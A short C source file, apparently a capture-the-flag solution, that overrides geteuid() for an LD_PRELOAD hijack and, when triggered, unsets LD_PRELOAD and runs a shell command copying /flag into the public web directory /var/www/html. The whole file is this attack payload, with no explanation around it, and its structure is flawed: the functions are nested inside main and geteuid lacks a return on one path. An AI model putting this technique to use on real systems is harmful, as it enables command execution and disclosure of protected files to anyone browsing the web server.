#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){
	void payload(){
		system("cat /flag > /var/www/html/flag");
	}

	int geteuid(){
		if(getenv("LD_PRELOAD")==NULL){
			return 0;
		}
		unsetenv("LD_PRELOAD");
		payload();
	}
}
